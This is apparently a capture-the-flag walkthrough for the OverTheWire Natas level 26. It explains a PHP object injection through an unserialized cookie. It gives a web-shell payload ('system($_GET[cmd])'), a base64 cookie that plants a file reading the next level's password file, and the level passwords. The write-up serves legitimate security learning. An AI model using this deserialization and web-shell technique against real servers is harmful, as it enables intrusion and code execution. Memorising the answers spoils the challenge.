# Natas26 — OverTheWire

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/BANNER.png" width="100%"/>](https://github.com/mauzware)

## 📸 Credentials

```
Username: natas26
Password: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
URL:      http://natas26.natas.labs.overthewire.org
```

---

## 🧠 Walkthrough

- Access the site using credentials.

- Now we have to draw a line.

  ```
  <body>
  <?php
      // sry, this is ugly as hell.
      // cheers kaliman ;)
      // - morla
  
      class Logger{
          private $logFile;
          private $initMsg;
          private $exitMsg;
  
          function __construct($file){
              // initialise variables
              $this->initMsg="#--session started--#\n";
              $this->exitMsg="#--session end--#\n";
              $this->logFile = "/tmp/natas26_" . $file . ".log";
  
              // write initial message
              $fd=fopen($this->logFile,"a+");
              fwrite($fd,$this->initMsg);
              fclose($fd);
          }
  
          function log($msg){
              $fd=fopen($this->logFile,"a+");
              fwrite($fd,$msg."\n");
              fclose($fd);
          }
  
          function __destruct(){
              // write exit message
              $fd=fopen($this->logFile,"a+");
              fwrite($fd,$this->exitMsg);
              fclose($fd);
          }
      }
  
      function showImage($filename){
          if(file_exists($filename))
              echo "<img src=\"$filename\">";
      }
  
      function drawImage($filename){
          $img=imagecreatetruecolor(400,300);
          drawFromUserdata($img);
          imagepng($img,$filename);
          imagedestroy($img);
      }
  
      function drawFromUserdata($img){
          if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
              array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
  
              $color=imagecolorallocate($img,0xff,0x12,0x1c);
              imageline($img,$_GET["x1"], $_GET["y1"],
                              $_GET["x2"], $_GET["y2"], $color);
          }
  
          if (array_key_exists("drawing", $_COOKIE)){
              $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
              if($drawing)
                  foreach($drawing as $object)
                      if( array_key_exists("x1", $object) &&
                          array_key_exists("y1", $object) &&
                          array_key_exists("x2", $object) &&
                          array_key_exists("y2", $object)){
  
                          $color=imagecolorallocate($img,0xff,0x12,0x1c);
                          imageline($img,$object["x1"],$object["y1"],
                                  $object["x2"] ,$object["y2"] ,$color);
  
                      }
          }
      }
  
      function storeData(){
          $new_object=array();
  
          if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
              array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
              $new_object["x1"]=$_GET["x1"];
              $new_object["y1"]=$_GET["y1"];
              $new_object["x2"]=$_GET["x2"];
              $new_object["y2"]=$_GET["y2"];
          }
  
          if (array_key_exists("drawing", $_COOKIE)){
              $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
          }
          else{
              // create new array
              $drawing=array();
          }
  
          $drawing[]=$new_object;
          setcookie("drawing",base64_encode(serialize($drawing)));
      }
  ?>
  
  <h1>natas26</h1>
  <div id="content">
  
  Draw a line:<br>
  <form name="input" method="get">
  X1<input type="text" name="x1" size=2>
  Y1<input type="text" name="y1" size=2>
  X2<input type="text" name="x2" size=2>
  Y2<input type="text" name="y2" size=2>
  <input type="submit" value="DRAW!">
  </form>
  
  <?php
      session_start();
  
      if (array_key_exists("drawing", $_COOKIE) ||
          (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
              array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){
          $imgfile="img/natas26_" . session_id() .".png";
          drawImage($imgfile);
          showImage($imgfile);
          storeData();
      }
  
  ?>
  ```

###  What does the code do (in plain terms)?

This page lets you draw lines on a canvas by providing `x1, y1, x2, y2` coordinates via GET parameters. It stores these lines in a cookie (`drawing`) and re-renders them each time you visit.

##  Key Components:
  `Logger` class

- Writes a log to a file in `/tmp/natas26_<input>.log`
- Writes:
    - `#--session started--#` on creation
    - `#--session end--#` on destruction
- Crucially: the log filename is **based on user-controlled input**.

-  `drawImage()`, `drawFromUserdata()`, and `storeData()`

- Create an image.
- Draw lines based on GET parameters and stored cookie (`drawing`) data.
- Cookie is a base64-encoded, **serialized PHP object array** of line data.

### How is this vulnerable?

## 1. **PHP Object Injection**

```
if (array_key_exists("drawing", $_COOKIE)){
    $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
```

- Unserializing user-controlled input is dangerous.
- You can craft a **malicious object**, such as `Logger`, and trigger its behavior.

## 2. **__destruct() RCE Vector**

```
function __destruct(){
    $fd=fopen($this->logFile,"a+");
    fwrite($fd,$this->exitMsg);
    fclose($fd);
}

```

- If you inject a `Logger` object via the `drawing` cookie with a custom `logFile` path (e.g. `/var/www/html/img/shell.php`), and control the content of `exitMsg`, you can **write PHP code into a web-accessible file** and get RCE.

### Exploitation Plan (in short):

1. **Craft a malicious `Logger` object** with:
    - `$logFile = 'img/shell.php'`
    - `$exitMsg = '<?php system($_GET["cmd"]); ?>'`
2. **Serialize → base64 encode → set it as the `drawing` cookie**
3. Refresh the page → `__destruct()` triggers → payload written to `img/shell.php`
4. **Access `img/shell.php?cmd=whoami` → you get code execution**

- Now, I wrote a script to generate a Base64 encoded cookie.

  ```
  $ php natas26-logger.php  
  Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo2NToiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbmF0YXMyNl9uNTNiYzUxaGFyNTlyOTBzbG4ybGQ1MzgwZS5waHAiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1OToiPD9waHAgZWNobyBzaGVsbF9leGVjKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30= 
  ```

- Copy paste the cookie value and refreshe the page. It will cause an error, but that is good!

  <img src=""/>

- Now visit `/img/natas26_[PHPSESSID].php` and get the password.

  <img src=""/>
  
---

## 🏁 Password for the next level

`Password for natas27 is: u3RRffXjysjgwFU6b9xa23i6prmUsYne`

---

Back to [Main Repo](https://github.com/mauzware/OverTheWire-Natas)
